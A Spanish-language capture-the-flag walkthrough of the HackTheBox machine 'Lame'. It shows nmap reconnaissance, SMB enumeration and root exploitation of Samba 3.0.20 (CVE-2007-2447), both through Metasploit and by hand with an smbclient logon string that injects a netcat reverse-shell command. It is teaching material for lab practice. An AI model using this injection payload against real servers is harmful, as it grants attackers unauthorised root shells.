Propiedades:
- OS: Linux
- Plataforma: HackTheBox
- Nivel: Easy
- Tags: #smb #CVE-2007-2447 #CVE-2011-2523:


![](assets/Pasted%20image%2020251210135756.png)
## Reconocimiento

Comienzo con un ping para comprobar conectividad:
```bash
> ping -c 1 10.129.3.68
PING 10.129.3.68 (10.129.3.68) 56(84) bytes of data.
64 bytes from 10.129.3.68: icmp_seq=1 ttl=63 time=112 ms

--- 10.129.3.68 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 111.676/111.676/111.676/0.000 ms
```

Realizo un escaneo con nmap para ver que puertos tenemos abiertos:

```bash
> sudo nmap -p- -sS -Pn -n --min-rate 5000 -vvv 10.129.3.68
------------------------------------------------------------
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack ttl 63
22/tcp   open  ssh          syn-ack ttl 63
139/tcp  open  netbios-ssn  syn-ack ttl 63
445/tcp  open  microsoft-ds syn-ack ttl 63
3632/tcp open  distccd      syn-ack ttl 63
```

- Puerto 21 FTP, 22 SSH, 139 y 445 SMB y por ultimo 3632 distccd

Sobre los puertos abiertos realizo un segundo escaneo mas profundo para detectar servicios, versiones y correr un conjunto de scripts predeterminados.

```bash
> sudo nmap -p 21,22,139,445,3632 -sV -sC -Pn -n -sS --min-rate 5000 -vvv 10.129.3.68 -oN target
----------------------------------------------------------------------------------------------
PORT     STATE SERVICE     REASON         VERSION
21/tcp   open  ftp         syn-ack ttl 63 vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.15.110
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBALz4hsc8a2Srq4nlW960qV8xwBG0JC+jI7fWxm5METIJH4tKr/xUTwsTYEYnaZLzcOiy21D3ZvOwYb6AA3765zdgCd2Tgand7F0YD5UtXG7b7fbz99chReivL0SIWEG/E96Ai+pqYMP2WD5KaOJwSIXSUajnU5oWmY5x85sBw+XDAAAAFQDFkMpmdFQTF+oRqaoSNVU7Z+hjSwAAAIBCQxNKzi1TyP+QJIFa3M0oLqCVWI0We/ARtXrzpBOJ/dt0hTJXCeYisKqcdwdtyIn8OUCOyrIjqNuA2QW217oQ6wXpbFh+5AQm8Hl3b6C6o8lX3Ptw+Y4dp0lzfWHwZ/jzHwtuaDQaok7u1f971lEazeJLqfiWrAzoklqSWyDQJAAAAIA1lAD3xWYkeIeHv/R3P9i+XaoI7imFkMuYXCDTq843YU6Td+0mWpllCqAWUV/CQamGgQLtYy5S0ueoks01MoKdOMMhKVwqdr08nvCBdNKjIEd3gH6oBk/YRnjzxlEAYBsvCmM4a0jmhz0oNiRWlc/F+bkUeFKrBx/D2fdfZmhrGg==
|   2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAstqnuFMBOZvO3WTEjP4TUdjgWkIVNdTq6kboEDjteOfc65TlI7sRvQBwqAhQjeeyyIk8T55gMDkOD0akSlSXvLDcmcdYfxeIF0ZSuT+nkRhij7XSSA/Oc5QSk3sJ/SInfb78e3anbRHpmkJcVgETJ5WhKObUNf1AKZW++4Xlc63M4KI5cjvMMIPEVOyR3AKmI78Fo3HJjYucg87JjLeC66I7+dlEYX6zT8i1XYwa/L1vZ3qSJISGVu8kRPikMv/cNSvki4j+qDYyZ2E5497W87+Ed46/8P42LNGoOV8OcX/ro6pAcbEPUdUEfkJrqi2YXbhvwIJ0gFMb6wfe5cnQew==
139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     syn-ack ttl 63 distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 65076/tcp): CLEAN (Timeout)
|   Check 2 (port 54694/tcp): CLEAN (Timeout)
|   Check 3 (port 55667/udp): CLEAN (Timeout)
|   Check 4 (port 55410/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2025-12-10T15:03:05-05:00
|_clock-skew: mean: 2h30m39s, deviation: 3h32m11s, median: 36s
```

- Puerto 21 FTP vsftpd 2.3.4 tiene el login anonymous habilitado.
- Puerto 22 SSH: OpenSSH 4.7p1 Debian 8ubuntu1
- Puerto 139,445 Samba: Samba smbd 3.0.20-Debian
- Puerto 3632: distccd v1 ((GNU) 4.2.4
## Enumeración


##### **Puerto 445 SMB**

Esta version del Samba es vulnerable a CVE-2007-2447.

Utilizamos `Netexec` para enumerar recursos del SMB

- Lo único que encontramos es el recurso `/tmp` donde la verdad no encontramos nada interesante.

```bash
> nxc smb 10.129.3.68 -u '' -p '' --shares
SMB         10.129.3.68     445    LAME             [*] Unix (name:LAME) (domain:hackthebox.gr) (signing:False) (SMBv1:True)
SMB         10.129.3.68     445    LAME             [+] hackthebox.gr\: 
SMB         10.129.3.68     445    LAME             [*] Enumerated shares
SMB         10.129.3.68     445    LAME             Share           Permissions     Remark
SMB         10.129.3.68     445    LAME             -----           -----------     ------
SMB         10.129.3.68     445    LAME             print$                          Printer Drivers
SMB         10.129.3.68     445    LAME             tmp             READ,WRITE      oh noes!
SMB         10.129.3.68     445    LAME             opt                             
SMB         10.129.3.68     445    LAME             IPC$                            IPC Service (lame server (Samba 3.0.20-Debian))
SMB         10.129.3.68     445    LAME             ADMIN$                          IPC Service (lame server (Samba 3.0.20-Debian))
```


##### **Puerto 21 FTP**

El puerto 21 tenia el login anonymous habilitado pero no habia absolutamente nada.

Decidí buscar exploits para la version  `vsftpd 2.3.4` y encontramos lo siguiente, estos exploits corresponden al  CVE-2011-2523:

```bash
searchsploit vsftpd 2.3.4
--------------------------------------------------- ---------------------------------
 Exploit Title                                     |  Path
--------------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution          | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metaspl | unix/remote/17491.rb
```

En metasploit también encontramos exploits:

```bash
[msf](Jobs:0 Agents:0) >> search exploit vsftpd 2.3.4

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
```

**Al probar estos exploits no tuvimos éxito.**

## Explotación con Metasploit


Sabemos que tenemos una version Samba 3.0.20 la cual es vulnerable a CVE-2007-2447. Buscando por exploits nos encontramos con esto

```bash
[msf](Jobs:0 Agents:0) >> search Samba 3.0.20

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution

```

Configuramos el payload y lo ejecutamos:

```bash
[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> set RHOSTS 10.129.3.68
RHOSTS => 10.129.3.68
[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> set LHOST tun0
LHOST => 10.10.15.110
[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> run
[*] Started reverse TCP handler on 10.10.15.110:4444 
[*] Command shell session 1 opened (10.10.15.110:4444 -> 10.129.3.68:43602) at 2025-12-10 14:48:52 -0600

whoami
root
id
uid=0(root) gid=0(root)
```

## Explotación Manual

Buscando exploits con `searchsploit` nos encontramos con esto:

```bash
searchsploit Samba 3.0.20
--------------------------------------------------------------------------------------------------------------------------------------------
 Exploit Title                                                                                                                              |  Path
-------------------------------------------------------------------------------------------------------------------------------------------- 
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                            | unix/remote/16320.rb
```

Al inspeccionar el codigo y notamos la variable `username` que basicamente será el payload

```rb
	def exploit
		connect
		# lol?
		username = "/=`nohup " + payload.encoded + "`" # Esto es el payload
```

Nosotros nos podemos conectar al smb al recurso `/tmp`,  y hacer uso de `logon` y "/=" para ejecutar comandos en el sistema. 

- Primero nos ponemos en escucha para recibir el output de los comandos

```bash
> sudo nc -nlvp 443
[sudo] password for wndr: 
Listening on 0.0.0.0 443
```

- Nos conectamos al recurso `/tmp` para ejecutar comandos, y nos mandamos una reverse-shell
- _logon_ es el comando que se utiliza para autenticarse en un servidor smb/samba
- _/=_ activa la ejecución del "user map script", basicamente lo que venga después de esto samba lo va a tomar como un script del sistema

```bash
> smbclient //10.129.3.95/tmp -N
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> logon "/=`nohup nc -e /bin/bash <TUIP> <TUPUERTO>`"
Password: 
```

- Recibimos el output 
```bash
Listening on 0.0.0.0 443
Connection received on 10.129.3.95 33186
whoami
root
```


***PWNED***

![](assets/Pasted%20image%2020251210145112.png)
